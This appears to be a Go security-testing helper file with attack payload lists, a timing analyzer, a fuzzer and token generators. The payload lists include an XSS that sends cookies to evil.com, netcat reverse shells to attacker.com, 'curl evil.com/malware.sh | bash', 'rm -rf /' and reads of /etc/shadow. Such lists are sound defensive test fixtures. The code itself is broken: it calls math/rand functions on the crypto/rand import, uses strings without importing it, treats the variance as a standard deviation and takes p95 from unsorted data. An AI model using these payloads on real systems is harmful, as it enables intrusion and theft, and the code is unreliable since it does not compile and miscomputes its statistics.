package security_test

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"testing"
	"testing/quick"
	"time"
)

// SecurityTestHelper provides utilities for security testing
type SecurityTestHelper struct{}

// AttackPayloadGenerator generates various attack payloads for testing
type AttackPayloadGenerator struct {
	sqlInjection      []string
	xss               []string
	pathTraversal     []string
	commandInjection  []string
	ldapInjection     []string
	xmlInjection      []string
}

// FuzzInput represents fuzzed input for testing
type FuzzInput struct {
	Value      string
	Length     int
	HasSpecial bool
	Type       string
}

// NewAttackPayloadGenerator creates comprehensive attack payload generator
func NewAttackPayloadGenerator() *AttackPayloadGenerator {
	return &AttackPayloadGenerator{
		sqlInjection: []string{
			"' OR '1'='1",
			"'; DROP TABLE users; --",
			"admin'--",
			"' UNION SELECT * FROM users--",
			"1' AND '1' = '1",
			"1' OR 1=1--",
			"admin' #",
			"' or 1=1/*",
			"' having 1=1--",
			"' group by userid having 1=1--",
			"' UNION SELECT NULL, username, password FROM users--",
			"1'; WAITFOR DELAY '00:00:10'--",
			"1' AND (SELECT COUNT(*) FROM users) > 0--",
		},
		xss: []string{
			"<script>alert('XSS')</script>",
			"<img src=x onerror=alert('XSS')>",
			"<svg onload=alert('XSS')>",
			"javascript:alert('XSS')",
			"<iframe src='javascript:alert(\"XSS\")'></iframe>",
			"<body onload=alert('XSS')>",
			"<input onfocus=alert('XSS') autofocus>",
			"'><script>alert(String.fromCharCode(88,83,83))</script>",
			"\"><script>alert('XSS')</script>",
			"<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
			"<svg/onload=alert('XSS')>",
			"<img src=x:alert(alt) onerror=eval(src) alt=xss>",
		},
		pathTraversal: []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"....//....//....//etc/passwd",
			"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			"..%252f..%252f..%252fetc%252fpasswd",
			"..;/..;/..;/etc/passwd",
			"/var/www/../../etc/passwd",
			"....\\\\....\\\\....\\\\windows\\\\system32",
		},
		commandInjection: []string{
			"; ls -la",
			"| cat /etc/passwd",
			"&& rm -rf /",
			"`whoami`",
			"$(cat /etc/shadow)",
			"; nc -e /bin/sh attacker.com 4444",
			"| nc attacker.com 1234 -e /bin/bash",
			"`curl http://evil.com/malware.sh | bash`",
			"$(wget http://evil.com/backdoor.php)",
		},
		ldapInjection: []string{
			"*)(uid=*",
			"admin)(|(password=*",
			"*)(objectClass=*",
			"*))%00",
			"admin)(&(password=*)",
			"*))(|(cn=*",
		},
		xmlInjection: []string{
			"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
			"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/\">]>",
			"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/shadow\">]>",
		},
	}
}

// GetSQLInjectionPayloads returns SQL injection test payloads
func (g *AttackPayloadGenerator) GetSQLInjectionPayloads() []string {
	return g.sqlInjection
}

// GetXSSPayloads returns XSS test payloads
func (g *AttackPayloadGenerator) GetXSSPayloads() []string {
	return g.xss
}

// GetPathTraversalPayloads returns path traversal test payloads
func (g *AttackPayloadGenerator) GetPathTraversalPayloads() []string {
	return g.pathTraversal
}

// GetCommandInjectionPayloads returns command injection test payloads
func (g *AttackPayloadGenerator) GetCommandInjectionPayloads() []string {
	return g.commandInjection
}

// GenerateRandomPayload generates random attack payload
func (g *AttackPayloadGenerator) GenerateRandomPayload() string {
	all := [][]string{
		g.sqlInjection,
		g.xss,
		g.pathTraversal,
		g.commandInjection,
	}

	// Select random category
	categoryIndex := randomInt(len(all))
	category := all[categoryIndex]

	// Select random payload from category
	payloadIndex := randomInt(len(category))
	return category[payloadIndex]
}

// TimingAnalyzer measures timing to detect timing attacks
type TimingAnalyzer struct {
	measurements []time.Duration
}

func NewTimingAnalyzer() *TimingAnalyzer {
	return &TimingAnalyzer{
		measurements: []time.Duration{},
	}
}

// Measure records execution time
func (t *TimingAnalyzer) Measure(fn func()) {
	start := time.Now()
	fn()
	duration := time.Since(start)
	t.measurements = append(t.measurements, duration)
}

// IsConstantTime checks if measurements show constant-time behavior
func (t *TimingAnalyzer) IsConstantTime(threshold float64) bool {
	if len(t.measurements) < 2 {
		return true
	}

	avg := t.Average()
	variance := t.Variance()
	stdDev := time.Duration(variance)

	// Check if standard deviation is within threshold
	ratio := float64(stdDev) / float64(avg)
	return ratio < threshold
}

// Average returns average execution time
func (t *TimingAnalyzer) Average() time.Duration {
	if len(t.measurements) == 0 {
		return 0
	}

	var sum time.Duration
	for _, d := range t.measurements {
		sum += d
	}
	return sum / time.Duration(len(t.measurements))
}

// Variance calculates variance in measurements
func (t *TimingAnalyzer) Variance() float64 {
	if len(t.measurements) == 0 {
		return 0
	}

	avg := t.Average()
	var sumSquares float64

	for _, d := range t.measurements {
		diff := float64(d - avg)
		sumSquares += diff * diff
	}

	return sumSquares / float64(len(t.measurements))
}

// FuzzTester provides fuzzing capabilities for security testing
type FuzzTester struct {
	config *quick.Config
}

func NewFuzzTester(maxCount int) *FuzzTester {
	return &FuzzTester{
		config: &quick.Config{
			MaxCount: maxCount,
		},
	}
}

// FuzzStringInput fuzzes string input validation
func (f *FuzzTester) FuzzStringInput(t *testing.T, validatorFunc func(string) bool) {
	testFunc := func(input string) bool {
		// Validator should never panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Validator panicked with input: %q, panic: %v", input, r)
			}
		}()

		validatorFunc(input)
		return true
	}

	if err := quick.Check(testFunc, f.config); err != nil {
		t.Error("Fuzzing detected issues:", err)
	}
}

// Generate implements quick.Generator for FuzzInput
func (f FuzzInput) Generate(rand *rand.Rand, size int) FuzzInput {
	length := rand.Intn(size) + 1
	value := make([]byte, length)

	specialChars := []byte{'\'', '"', '<', '>', '&', ';', '|', '`', '\n', '\r', '\x00'}
	hasSpecial := false

	for i := 0; i < length; i++ {
		if rand.Intn(10) < 3 { // 30% chance of special char
			value[i] = specialChars[rand.Intn(len(specialChars))]
			hasSpecial = true
		} else {
			value[i] = byte(rand.Intn(94) + 32) // Printable ASCII
		}
	}

	inputTypes := []string{"sql", "xss", "path", "command", "normal"}

	return FuzzInput{
		Value:      string(value),
		Length:     length,
		HasSpecial: hasSpecial,
		Type:       inputTypes[rand.Intn(len(inputTypes))],
	}
}

// SecureRandomGenerator generates cryptographically secure random values
type SecureRandomGenerator struct{}

// GenerateToken generates secure random token
func (s *SecureRandomGenerator) GenerateToken(length int) (string, error) {
	bytes := make([]byte, length)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return base64.URLEncoding.EncodeToString(bytes), nil
}

// GenerateSessionID generates secure session identifier
func (s *SecureRandomGenerator) GenerateSessionID() (string, error) {
	return s.GenerateToken(32)
}

// GenerateNonce generates unique nonce for replay protection
func (s *SecureRandomGenerator) GenerateNonce() (string, error) {
	bytes := make([]byte, 16)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return fmt.Sprintf("%x-%d", bytes, time.Now().UnixNano()), nil
}

// PerformanceMonitor tracks security operation performance
type PerformanceMonitor struct {
	operations map[string][]time.Duration
}

func NewPerformanceMonitor() *PerformanceMonitor {
	return &PerformanceMonitor{
		operations: make(map[string][]time.Duration),
	}
}

// Track records operation execution time
func (p *PerformanceMonitor) Track(operation string, fn func()) {
	start := time.Now()
	fn()
	duration := time.Since(start)

	p.operations[operation] = append(p.operations[operation], duration)
}

// GetStats returns performance statistics for operation
func (p *PerformanceMonitor) GetStats(operation string) PerformanceStats {
	durations := p.operations[operation]
	if len(durations) == 0 {
		return PerformanceStats{}
	}

	var sum, min, max time.Duration
	min = durations[0]
	max = durations[0]

	for _, d := range durations {
		sum += d
		if d < min {
			min = d
		}
		if d > max {
			max = d
		}
	}

	avg := sum / time.Duration(len(durations))

	// Calculate p95
	p95 := durations[int(float64(len(durations))*0.95)]

	return PerformanceStats{
		Operation:  operation,
		Count:      len(durations),
		Average:    avg,
		Min:        min,
		Max:        max,
		P95:        p95,
		MeetsGoal:  avg < 10*time.Millisecond, // <10ms requirement
	}
}

// PerformanceStats contains performance metrics
type PerformanceStats struct {
	Operation string
	Count     int
	Average   time.Duration
	Min       time.Duration
	Max       time.Duration
	P95       time.Duration
	MeetsGoal bool
}

// MalformedInputGenerator generates malformed/edge case inputs
type MalformedInputGenerator struct{}

// GenerateMalformedInputs returns various malformed inputs
func (m *MalformedInputGenerator) GenerateMalformedInputs() []string {
	return []string{
		"",                               // Empty
		" ",                              // Whitespace only
		string([]byte{0x00}),             // Null byte
		string([]byte{0xFF, 0xFE, 0xFD}), // Invalid UTF-8
		strings.Repeat("A", 10000),       // Very long input
		"\r\n\r\n",                       // CRLF
		"%00",                            // Null encoded
		"../../",                         // Path traversal
		"<script>",                       // Script tag
		"' OR 1=1--",                     // SQL
		"\u0000",                         // Unicode null
		"\\x00",                          // Escaped null
	}
}

// GenerateEdgeCaseNumbers returns edge case numeric values
func (m *MalformedInputGenerator) GenerateEdgeCaseNumbers() []interface{} {
	return []interface{}{
		0,
		-1,
		int32(2147483647),  // Max int32
		int32(-2147483648), // Min int32
		int64(9223372036854775807),  // Max int64
		int64(-9223372036854775808), // Min int64
		float64(1.7976931348623157e+308), // Max float64
		float64(2.2250738585072014e-308), // Min positive float64
	}
}

// Helper functions

func randomInt(max int) int {
	if max == 0 {
		return 0
	}
	b := make([]byte, 1)
	rand.Read(b)
	return int(b[0]) % max
}
